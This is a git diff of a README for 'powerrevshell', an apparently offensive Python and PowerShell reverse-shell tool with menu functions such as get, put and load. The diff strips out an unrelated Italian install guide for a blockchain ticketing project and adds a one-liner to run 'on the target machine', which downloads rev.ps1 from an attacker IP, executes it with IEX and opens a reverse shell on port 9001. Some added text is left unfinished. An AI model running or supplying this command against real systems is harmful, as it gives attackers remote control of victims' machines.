@@ -11,10 +11,12 @@ It is written with Python and Powershell. To simply install it:
 3.  ```
     chmod +x powerrevshell.py or python3 powerrevshell.py
     ```
-It comes with several function accesibbile via the "menu" option.
+## Powerrevshell
 
-### get
-### put
+Powerrevshell.py comes with several function accesibbile via the "menu" option.
+
+### get - put
+The 
 ### smb-get
 ### down-file
 ### load
@@ -27,45 +29,11 @@ It comes with several function accesibbile via the "menu" option.
 ### close
 
 
-## Powerrevshell
-
-Powerrevshell.py 
-
 ## Rev.ps1
 
-# Progetto Software Cybersecurity
+Rev.ps1 is the powershell script to connect back to us.
+To start the reverse shell run the following code on the target machine.
 
-### Implementazione di una biglietteria online tramite blockchain
-
-##### Guida installazione e utilizzo (windows)
-
-1. Scaricare e installare [XAMPP](https://www.apachefriends.org/it/index.html)
-    - Importare in phpmyadmin il file *cybersecurity_project.sql*
-2. Installare [WSL2](https://docs.microsoft.com/en-us/windows/wsl/install-manual)
-    - Seguire le istruzioni di “Manual Installation Steps” fino al passo 6 escluso
-3. Installare [Docker](https://docs.docker.com/docker-for-windows/install/)
-    - Scaricare l’installer e seguire le istruzioni (verificato con Docker 3.3.1)
-    - Verificare di cliccare sulla check box «Use WSL 2 based engine»
-    - Al termine dell’installazione, è necessario riavviare
-4. Installare [NodeJS](https://nodejs.org/it/) per Windows
-5. Installare quorum-wizard
-    - Aprire terminale di Windows
-    - Eseguire, optando per docker-compose quando richiesto:
-  ```
-  npx quorum-wizard
-  cd networks/<nome_network>/
-  start.cmd
-  ``` 
-6. Importare il progetto nel proprio IDE ed eseguire le seguenti installazioni:
-  ```
-  pip install Flask 
-  pip install mysql-connector-python 
-  pip install --upgrade Pillow 
-  pip install web3 
-  pip install cryptography
-  ```
-7. Eseguire il *main* e aprire l'indirizzo nella console
-
-
-
-
+```
+(New-Object System.Net.WebClient).DownloadString('http://<IP>/rev.ps1') IEX; Send-Shell -i <IP> -p 9001
+```
